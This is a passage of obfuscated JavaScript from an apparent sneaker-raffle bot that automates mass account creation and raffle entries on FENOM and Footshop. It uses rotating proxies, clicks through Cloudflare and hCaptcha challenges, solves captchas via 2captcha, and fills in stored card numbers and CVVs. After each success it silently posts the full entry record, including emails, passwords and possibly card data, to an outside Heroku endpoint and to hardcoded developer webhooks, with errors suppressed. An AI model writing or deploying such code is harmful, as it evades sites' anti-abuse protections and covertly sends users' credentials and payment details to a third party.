                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x35f00e = await _0x4bdd84['newPage']();
                            await _0x35f00e['setViewport']({
                                'width': 0x500 + _0x8794b(0x1, 0x32),
                                'height': 0x2d9 + _0x8794b(0x1, 0x32)
                            });
                            const _0x55c726 = await _0x35f00e['target']()['createCDPSession'](), { windowId: _0x5e12bb } = await _0x55c726['send']('Browser.getWindowForTarget');
                            await _0x35f00e['authenticate']({
                                'username': '' + _0x31d072[0x2],
                                'password': '' + _0x31d072[0x3]
                            }), console['log'](_0x11b348() + '\x20[' + _0x131506['name'] + ']\x20Task\x20' + (_0x31336a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x35f00e['goto']('' + _0xacc707, { 'waitUntil': 'networkidle2' }), console['log'](_0x11b348() + '\x20[' + _0x131506['name'] + ']\x20Task\x20' + (_0x31336a + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0xaebb71(0x1388);
                            var _0x493a34 = await _0x35f00e['$']('.hcaptcha-box');
                            if (_0x493a34) {
                                console['log'](_0x11b348() + '\x20[' + _0x131506['name'] + ']\x20Task\x20' + (_0x31336a + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0xaebb71(0x2710);
                                const _0x5d0401 = await _0x35f00e['$']('.hcaptcha-box');
                                if (_0x5d0401)
                                    try {
                                        await _0x5d0401['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x35f00e['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x58a92c = await _0x35f00e['$']('.hcaptcha-box');
                                    if (_0x58a92c)
                                        try {
                                            await _0x58a92c['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0x35f00e['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x55c726['send']('Browser.setWindowBounds', {
                                    'windowId': _0x5e12bb,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0xaebb71(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            console['log'](_0x11b348() + '\x20[' + _0x131506['name'] + ']\x20Task\x20' + (_0x31336a + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x35f00e['type']('input[name=\x22firstname\x22]', '' + _0x28d668[_0x31336a]['FirstName']), await _0xaebb71(0x1f4), await _0x35f00e['type']('input[name=\x22lastname\x22]', '' + _0x28d668[_0x31336a]['LastName']), await _0xaebb71(0x1f4), await _0x35f00e['type']('input[name=\x22email\x22]', '' + _0x28d668[_0x31336a]['Email']), await _0xaebb71(0x1f4), await _0x35f00e['type']('input[name=\x22password\x22]', '' + _0x28d668[_0x31336a]['Password']), await _0xaebb71(0x258), await _0x35f00e['$eval']('input[name=\x22psgdpr\x22]', _0x51a475 => _0x51a475['click']()), await _0xaebb71(0x1f4), console['log'](_0x11b348() + '\x20[' + _0x131506['name'] + ']\x20Task\x20' + (_0x31336a + 0x1) + '\x20:\x20Sending\x20Request'), await _0x35f00e['$eval']('#customer-form', _0x4e2e59 => _0x4e2e59['submit']());
                            try {
                                try {
                                    await _0x35f00e['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                } catch {
                                    throw new Error('Succes-response\x20not\x20found');
                                }
                                _0x4ccc83 = 'no', console['log'](_0x218a39['green'](_0x11b348() + '\x20[' + _0x131506['name'] + ']\x20Task\x20' + (_0x31336a + 0x1) + '\x20:\x20Account\x20' + _0x28d668[_0x31336a]['Email'] + '\x20Generated')), _0x4a3ff4['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x28d668[_0x31336a]['Email'] + ',' + _0x28d668[_0x31336a]['Password']);
                                let _0x2b30cb = _0x28d668[_0x31336a];
                                try {
                                    prxdata = {
                                        'username': _0x3f93ac['replace']('#', ''),
                                        'module': _0x131506['name'],
                                        'entrydata': JSON['stringify'](_0x2b30cb),
                                        'proxy': '' + _0x51a379[_0x31336a]
                                    };
                                    var _0x2fdb7c = JSON['stringify'](prxdata);
                                    let _0x3299f = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x52d98a['post']('https://jraffles.herokuapp.com/success', _0x2fdb7c, _0x3299f);
                                } catch (_0x10da47) {
                                }
                                try {
                                    _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x1ced39['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4401f2(_0x1acce0, _0x1ced39['succesDEVMSG']);
                            } catch (_0x23d473) {
                                throw new Error('Account\x20generation\x20failed');
                            }
                        } catch (_0x18a16c) {
                            console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x131506['name'] + ']\x20Task\x20' + (_0x31336a + 0x1) + '\x20:\x20' + _0x18a16c)), _0x43107e = '' + _0x18a16c;
                            var _0x4fc260 = await _0x3ead77(_0x28d668[_0x31336a], _0x131506, 'acc', !![], _0x43107e);
                            _0x1ced39['errorDEV'] = { 'embeds': [_0x4fc260] }, _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x1ced39['errorDEV']), await _0x4401f2(_0x2631ac, _0x1ced39['errorDEV']), _0x4ccc83 = 'yes';
                        } finally {
                            _0x4bdd84['close']();
                            if (_0x4ccc83 == 'yes' && _0x530b3a != 0x5 && _0x43107e != 'Size\x20Not\x20Found') {
                                console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x131506['name'] + ']\x20Task\x20' + (_0x31336a + 0x1) + '\x20:\x20Retrying\x20(' + _0x530b3a + '\x20/\x205)')), _0x31336a = _0x31336a - 0x1, _0x530b3a = _0x530b3a + 0x1;
                                continue;
                            }
                            _0x4ccc83 == 'yes' && _0x530b3a >= 0x5 && (_0x47d653(_0x28d668[_0x31336a], _0x131506), _0x4ccc83 = 'no', _0x530b3a = 0x0), console['log'](_0x11b348() + '\x20[' + _0x131506['name'] + ']\x20Waiting\x20for\x20' + _0x579cef['delay'] + '\x20ms'), await _0xaebb71(_0x579cef['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x174a4a(_0x385f1c, _0x487eba, _0x224e65) {
                    _0x181ece['use'](_0x26fa28()), _0x181ece['use'](_0x2dba44({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x579cef['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x567efc = 0x0; _0x567efc < _0x487eba['length']; _0x567efc++) {
                        if (_0x266fc7 != 'yes')
                            var _0x266fc7 = '', _0x3e33af = 0x0;
                        var _0x4b412b;
                        try {
                            await _0x48a0b3(_0x487eba, _0x567efc);
                        } catch {
                            _0x266fc7 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x3e0125(_0x385f1c['name'] + '\x20Task\x20' + (_0x567efc + 0x1) + '\x20/\x20' + _0x487eba['length'] + '\x20||\x20File:\x20' + _0x5d3bce + '\x20Proxies:\x20' + _0x2ffd47);
                        const _0x275bee = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x2530be = Math['round'](Math['random']() * (_0x224e65['length'] - 0x1)), _0x3aa2d7 = _0x224e65[_0x2530be]['split'](':'), _0x369439;
                        try {
                            _0x369439 = await _0x181ece['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x3aa2d7[0x0] + ':' + _0x3aa2d7[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x369439 = await _0x181ece['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x3aa2d7[0x0] + ':' + _0x3aa2d7[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1f783e = await _0x369439['newPage'](), _0x413a37 = await _0x1f783e['target']()['createCDPSession'](), { windowId: _0x4ef0d3 } = await _0x413a37['send']('Browser.getWindowForTarget');
                            await _0x1f783e['authenticate']({
                                'username': '' + _0x3aa2d7[0x2],
                                'password': '' + _0x3aa2d7[0x3]
                            }), console['log'](_0x11b348() + '\x20[' + _0x385f1c['name'] + ']\x20Task\x20' + (_0x567efc + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1f783e['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x11b348() + '\x20[' + _0x385f1c['name'] + ']\x20Task\x20' + (_0x567efc + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0xaebb71(0xbb8), await _0x413a37['send']('Browser.setWindowBounds', {
                                'windowId': _0x4ef0d3,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0xaebb71(0x1f40);
                            try {
                                await _0x1f783e['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0xaebb71(0x1388), console['log'](_0x11b348() + '\x20[' + _0x385f1c['name'] + ']\x20Task\x20' + (_0x567efc + 0x1) + '\x20:\x20Logging\x20in'), await _0x1f783e['type']('input[name=\x22email\x22]', '' + _0x487eba[_0x567efc]['Email']), await _0xaebb71(0x1f4), await _0x1f783e['type']('input[name=\x22password\x22]', '' + _0x487eba[_0x567efc]['Password']), await _0xaebb71(0x258), await _0x1f783e['$eval']('#login-form', _0x58e23e => _0x58e23e['submit']()), await _0x1f783e['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0xaebb71(0x1f4), await _0x1f783e['goto']('' + _0x487eba[_0x567efc]['Url']), await _0x1f783e['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x11b348() + '\x20[' + _0x385f1c['name'] + ']\x20Task\x20' + (_0x567efc + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x487eba[_0x567efc]['Size']);
                            if (_0x487eba[_0x567efc]['Size'] != 'RANDOM') {
                                var _0x25aae3 = '\x20' + _0x487eba[_0x567efc]['Size'] + '\x20';
                                const _0x348fd9 = await _0x1f783e['$x']('//span[contains(text(),\x20' + _0x25aae3 + ')]');
                                await _0x348fd9[0x0]['click']();
                            } else {
                                const _0x704b31 = await _0x1f783e['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x59e6ed = Math['round'](Math['random']() * (_0x704b31['length'] - 0x1));
                                await _0x704b31[_0x59e6ed]['click']();
                            }
                            await _0xaebb71(0x258), await _0x1f783e['click']('#cookieChoiceDismiss'), await _0xaebb71(0x3e8), await _0x1f783e['type']('#instagram-account', '' + _0x487eba[_0x567efc]['Follower']), await _0xaebb71(0x28a), await _0x1f783e['click']('#book-btn'), await _0xaebb71(0xbb8);
                            try {
                                await _0x1f783e['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0xaebb71(0x1f4), console['log'](_0x11b348() + '\x20[' + _0x385f1c['name'] + ']\x20Task\x20' + (_0x567efc + 0x1) + '\x20:\x20' + _0x218a39['cyan']('Solving\x20Captcha')), await _0x1f783e['solveRecaptchas'](), console['log'](_0x11b348() + '\x20[' + _0x385f1c['name'] + ']\x20Task\x20' + (_0x567efc + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0xaebb71(0x7d0), await _0x1f783e['$eval']('#book-btn-for-sure', _0x3f5aa0 => _0x3f5aa0['click']()), await _0xaebb71(0x12c), await _0x1f783e['click']('#book-btn-for-sure'), await _0xaebb71(0xdac);
                            const _0xcb3ef6 = await _0x1f783e['$eval']('.reservation-popup\x20>\x20.title', _0x3e25dc => {
                                return _0x3e25dc['innerHTML'];
                            });
                            if (_0xcb3ef6) {
                                _0x266fc7 = 'no', _0x20f501(_0x487eba[_0x567efc], _0x385f1c), console['log'](_0x218a39['green'](_0x11b348() + '\x20[' + _0x385f1c['name'] + ']\x20Task\x20' + (_0x567efc + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x168b23 = await _0x3ead77(_0x487eba[_0x567efc], _0x385f1c, 'dev', ![]), _0x30f55c = await _0x3ead77(_0x487eba[_0x567efc], _0x385f1c, 'pub', ![]);
                                let _0x546b4e = _0x487eba[_0x567efc];
                                try {
                                    prxdata = {
                                        'username': _0x3f93ac['replace']('#', ''),
                                        'module': _0x385f1c['name'],
                                        'entrydata': JSON['stringify'](_0x546b4e),
                                        'proxy': '' + _0x224e65[_0x567efc]
                                    };
                                    var _0x52ec4d = JSON['stringify'](prxdata);
                                    let _0x24bf5e = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x52d98a['post']('https://jraffles.herokuapp.com/success', _0x52ec4d, _0x24bf5e);
                                } catch (_0x4fbfb7) {
                                }
                                const _0x43a938 = {
                                    'succesDEVMSG': { 'embeds': [_0x168b23] },
                                    'succesPUBMSG': { 'embeds': [_0x30f55c] }
                                };
                                try {
                                    _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x43a938['succesDEVMSG']), await _0xaebb71(0xc8), await _0x4401f2(_0x1f75ad, _0x43a938['succesDEVMSG']), await _0xaebb71(0xc8), await _0x4401f2(_0x2aae93, _0x43a938['succesPUBMSG']);
                                } catch (_0x483a4c) {
                                    console['log'](_0x218a39['yellow'](_0x11b348() + '\x20[' + _0x385f1c['name'] + ']\x20Task\x20' + (_0x567efc + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x483a4c));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x4429ec) {
                            console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x385f1c['name'] + ']\x20Task\x20' + (_0x567efc + 0x1) + '\x20:\x20' + _0x4429ec)), _0x4b412b = '' + _0x4429ec;
                            var _0x3f9c64 = await _0x3ead77(_0x487eba[_0x567efc], _0x385f1c, 'dev', !![], _0x4b412b), _0x168b23 = await _0x3ead77(_0x487eba[_0x567efc], _0x385f1c, 'dev', ![]), _0x30f55c = await _0x3ead77(_0x487eba[_0x567efc], _0x385f1c, 'pub', ![]);
                            const _0x5c0904 = {
                                'succesDEVMSG': { 'embeds': [_0x168b23] },
                                'succesPUBMSG': { 'embeds': [_0x30f55c] }
                            };
                            _0x5c0904['errorDEV'] = { 'embeds': [_0x3f9c64] }, _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x5c0904['errorDEV']), await _0x4401f2(_0x2631ac, _0x5c0904['errorDEV']), _0x4429ec != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x266fc7 = 'yes');
                        } finally {
                            _0x369439['close']();
                            if (_0x266fc7 == 'yes' && _0x3e33af != 0x5 && _0x4b412b != 'Size\x20Not\x20Found') {
                                console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x385f1c['name'] + ']\x20Task\x20' + (_0x567efc + 0x1) + '\x20:\x20Retrying\x20(' + _0x3e33af + '\x20/\x205)')), _0x567efc = _0x567efc - 0x1, _0x3e33af = _0x3e33af + 0x1;
                                continue;
                            }
                            _0x266fc7 == 'yes' && _0x3e33af >= 0x5 && (_0x47d653(_0x487eba[_0x567efc], _0x385f1c), _0x266fc7 = 'no', _0x3e33af = 0x0), console['log'](_0x11b348() + '\x20[' + _0x385f1c['name'] + ']\x20Waiting\x20for\x20' + _0x579cef['delay'] + '\x20ms'), await _0xaebb71(_0x579cef['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x485df8, _0x5cbdef, _0x4bfe26) {
                _0x181ece['use'](_0x26fa28()), _0x181ece['use'](_0x2dba44({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x579cef['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x16866c = 0x0; _0x16866c < _0x5cbdef['length']; _0x16866c++) {
                    var _0x5d58ec;
                    if (_0x1bd683 != 'yes')
                        var _0x1bd683 = '', _0xf570a2 = 0x0;
                    var _0x457b2a = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x3f93ac
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x5cbdef[_0x16866c]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x5cbdef[_0x16866c]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x579cef['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x4a92ac
                            }
                        ]
                    }], _0x1bdbd4 = await _0x3ead77(_0x5cbdef[_0x16866c], _0x485df8, 'dev', ![]), _0xc463d9 = await _0x3ead77(_0x5cbdef[_0x16866c], _0x485df8, 'pub', ![]);
                    const _0x22bde8 = {
                        'succesDEVMSG': { 'embeds': [_0x1bdbd4] },
                        'succesPUBMSG': { 'embeds': [_0xc463d9] }
                    }, _0x38c472 = { 'embeds': _0x457b2a };
                    try {
                        await _0x48a0b3(_0x5cbdef, _0x16866c);
                    } catch {
                        _0x1bd683 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x5cbdef[_0x16866c]['Email'] == '' || _0x5cbdef[_0x16866c]['FirstName'] == '' || _0x5cbdef[_0x16866c]['LastName'] == '' || _0x5cbdef[_0x16866c]['Country'] == '' || _0x5cbdef[_0x16866c]['Size'] == '' || _0x5cbdef[_0x16866c]['Address1'] == '' || _0x5cbdef[_0x16866c]['Zip'] == '') {
                        console['log'](_0x11b348() + '\x20[' + _0x485df8['name'] + ']\x20Task\x20' + (_0x16866c + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x5cbdef[_0x16866c]['Email'] == '' || _0x5cbdef[_0x16866c]['FirstName'] == '' || _0x5cbdef[_0x16866c]['LastName'] == '' || _0x5cbdef[_0x16866c]['Country'] == '' || _0x5cbdef[_0x16866c]['Size'] == '' || _0x5cbdef[_0x16866c]['Address1'] == '' || _0x5cbdef[_0x16866c]['Zip'] == '' || _0x5cbdef[_0x16866c]['Phone'] == '') {
                        console['log'](_0x11b348() + '\x20[' + _0x485df8['name'] + ']\x20Task\x20' + (_0x16866c + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0xeba762 = '' + _0x5cbdef[_0x16866c]['Url'];
                    if (_0x579cef['useRandomProxy'] = ![])
                        var _0xc2d980 = _0x4bfe26[_0x16866c]['split'](':');
                    else
                        var _0x40d9b7 = Math['round'](Math['random']() * (_0x4bfe26['length'] - 0x1)), _0xc2d980 = _0x4bfe26[_0x40d9b7]['split'](':');
                    var _0x5b2343;
                    try {
                        _0x5b2343 = await _0x181ece['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0xc2d980[0x0] + ':' + _0xc2d980[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x5b2343 = await _0x181ece['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0xc2d980[0x0] + ':' + _0xc2d980[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x1301b9 = await _0x5b2343['newPage']();
                        await _0x1301b9['authenticate']({
                            'username': '' + _0xc2d980[0x2],
                            'password': '' + _0xc2d980[0x3]
                        }), console['log'](_0x11b348() + '\x20[' + _0x485df8['name'] + ']\x20Task\x20' + (_0x16866c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1301b9['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x1301b9['setRequestInterception'](!![]), _0x1301b9['on']('request', _0x456f88 => {
                            _0x456f88['resourceType']() === 'image' || _0x456f88['resourceType']() === 'font' || _0x456f88['resourceType']() === 'media' ? _0x456f88['abort']() : _0x456f88['continue']();
                        });
                        try {
                            await _0x1301b9['goto'](_0xeba762), await _0xaebb71(0xbb8), await _0x1301b9['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x1301b9['click']('.control__JhutY'), await _0xaebb71(0x1f4);
                        if (_0x5cbdef[_0x16866c]['Size'] != 'RANDOM')
                            try {
                                const _0x419358 = await _0x1301b9['$x']('//div[contains(text(),\x20\x27' + _0x5cbdef[_0x16866c]['Size'] + '\x27)]');
                                await _0x419358[0x0]['click']();
                            } catch {
                                console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x485df8['name'] + ']\x20Task\x20' + (_0x16866c + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x1def6f = await _0x1301b9['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x221a99 = Math['round'](Math['random']() * (_0x1def6f['length'] - 0x1));
                            await _0x1def6f[_0x221a99]['click']();
                        }
                        await _0xaebb71(0x4b0);
                        const _0x2b99df = await _0x1301b9['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x2b99df[0x0]['click'](), await _0x1301b9['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x11b348() + '\x20[' + _0x485df8['name'] + ']\x20Task\x20' + (_0x16866c + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x1301b9['type']('input[name=\x22email\x22]', '' + _0x5cbdef[_0x16866c]['Email']), await _0xaebb71(0x640), await _0x1301b9['type']('input[name=\x22phone\x22]', '' + _0x5cbdef[_0x16866c]['Phone']), await _0xaebb71(0x4b0), await _0x1301b9['click']('button.btn.continue-button__1RtsS'), await _0xaebb71(0x4b0);
                        try {
                            await _0x1301b9['type']('input[name=\x22firstName\x22]', '' + _0x5cbdef[_0x16866c]['FirstName']), await _0xaebb71(0x258);
                        } catch {
                            const _0xccc7a3 = await _0x1301b9['$$eval']('.invalid-feedback\x20>\x20div', _0x4d9caf => {
                                return _0x4d9caf['map'](_0x4dd4b1 => _0x4dd4b1['innerText']);
                            });
                            console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x485df8['name'] + ']\x20Task\x20' + (_0x16866c + 0x1) + '\x20:\x20' + _0xccc7a3));
                            continue;
                        }
                        await _0x1301b9['type']('input[name=\x22lastName\x22]', '' + _0x5cbdef[_0x16866c]['LastName']), await _0xaebb71(0xc8), await _0x1301b9['type']('input[name=\x22instagramUsername\x22]', '' + _0x5cbdef[_0x16866c]['Follower']), await _0xaebb71(0x4b0), await _0x1301b9['click']('button.btn.continue-button__1RtsS'), await _0xaebb71(0x3e8), console['log'](_0x11b348() + '\x20[' + _0x485df8['name'] + ']\x20Task\x20' + (_0x16866c + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x1301b9['select']('select[name=\x22country\x22]', '' + _0x5cbdef[_0x16866c]['Country']), await _0xaebb71(0x2bc), await _0x1301b9['type']('input[name=\x22streetName\x22]', '' + _0x5cbdef[_0x16866c]['Address1']), await _0xaebb71(0x258), await _0x1301b9['type']('input[name=\x22houseNumber\x22]', _0x5cbdef[_0x16866c]['HouseNumber'] + '\x20' + _0x5cbdef[_0x16866c]['Address2']), await _0xaebb71(0xc8), await _0x1301b9['type']('input[name=\x22postalCode\x22]', '' + _0x5cbdef[_0x16866c]['Zip']), await _0xaebb71(0x1f4), await _0x1301b9['type']('input[name=\x22city\x22]', '' + _0x5cbdef[_0x16866c]['City']), await _0xaebb71(0x4b0), await _0x1301b9['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0xaebb71(0x4b0), await _0x1301b9['click']('button.btn.continue-button__1RtsS'), await _0xaebb71(0x4b0), console['log'](_0x11b348() + '\x20[' + _0x485df8['name'] + ']\x20Task\x20' + (_0x16866c + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x1301b9['solveRecaptchas'](), console['log'](_0x11b348() + '\x20[' + _0x485df8['name'] + ']\x20Task\x20' + (_0x16866c + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0xaebb71(0xbb8), await _0x1301b9['click']('button.btn.continue-button__1RtsS'), await _0xaebb71(0x1388), console['log'](_0x11b348() + '\x20[' + _0x485df8['name'] + ']\x20Task\x20' + (_0x16866c + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x1301b9['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1301b9['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xaebb71(0x4b0), await _0x1301b9['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x5cbdef[_0x16866c]['CardNumber']), await _0xaebb71(0x320), await _0x1301b9['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x1301b9['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x5cbdef[_0x16866c]['ExpiryDate']), await _0xaebb71(0x4b0), await _0x1301b9['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x1301b9['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x5cbdef[_0x16866c]['CVV']), await _0xaebb71(0x226), await _0x1301b9['type']('input[name=\x22holderName\x22]', '' + _0x5cbdef[_0x16866c]['NameOnCard']), await _0xaebb71(0x226), await _0x1301b9['click']('button.adyen-checkout__button'), console['log'](_0x11b348() + '\x20[' + _0x485df8['name'] + ']\x20Task\x20' + (_0x16866c + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x1301b9['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0xaebb71(0xbb8);
                        } catch (_0x125fcf) {
                            console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x485df8['name'] + ']\x20Task\x20' + (_0x16866c + 0x1) + '\x20:\x203DS\x20Failed')), _0x5d58ec = '3DS\x20Error\x20' + _0x125fcf;
                            var _0x38b2ea = await _0x3ead77(_0x5cbdef[_0x16866c], _0x485df8, 'dev', !![], _0x5d58ec);
                            _0x22bde8['errorDEV'] = { 'embeds': [_0x38b2ea] };
                            _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x22bde8['errorDEV']);
                            await _0x4401f2(_0x2631ac, _0x22bde8['errorDEV']);
                            continue;
                        }
                        _0x20f501(_0x5cbdef[_0x16866c], _0x485df8), console['log'](_0x218a39['green'](_0x11b348() + '\x20[' + _0x485df8['name'] + ']\x20Task\x20' + (_0x16866c + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x1ecd5f = _0x5cbdef[_0x16866c];
                        try {
                            prxdata = {
                                'username': _0x3f93ac['replace']('#', ''),
                                'module': _0x485df8['name'],
                                'entrydata': JSON['stringify'](_0x1ecd5f),
                                'proxy': '' + _0x4bfe26[_0x16866c]
                            };
                            var _0x5c15e3 = JSON['stringify'](prxdata);
                            let _0x555868 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x52d98a['post']('https://jraffles.herokuapp.com/success', _0x5c15e3, _0x555868);
                        } catch (_0x36a811) {
                        }
                        if (_0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '')
                            try {
                                await _0x4401f2(_0x579cef['webhook'], _0x22bde8['succesDEVMSG']);
                            } catch {
                            }
                        await _0xaebb71(0xc8), await _0x4401f2(_0x1f75ad, _0x22bde8['succesDEVMSG']), await _0xaebb71(0xc8);
                        try {
                            await _0x4401f2(_0x2aae93, _0x22bde8['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x5dc477) {
                        console['log'](_0x11b348() + '\x20[' + _0x485df8['name'] + ']\x20Task\x20' + (_0x16866c + 0x1) + '\x20:\x20' + _0x5dc477), _0x5d58ec = '' + _0x5dc477;
                        var _0x38b2ea = await _0x3ead77(_0x5cbdef[_0x16866c], _0x485df8, 'dev', !![], _0x5d58ec);
                        _0x22bde8['errorDEV'] = { 'embeds': [_0x38b2ea] }, _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x22bde8['errorDEV']), await _0x4401f2(_0x2631ac, _0x22bde8['errorDEV']), _0x1bd683 = 'yes';
                    } finally {
                        _0x5b2343['close']();
                        if (_0x1bd683 == 'yes' && _0xf570a2 != 0x5) {
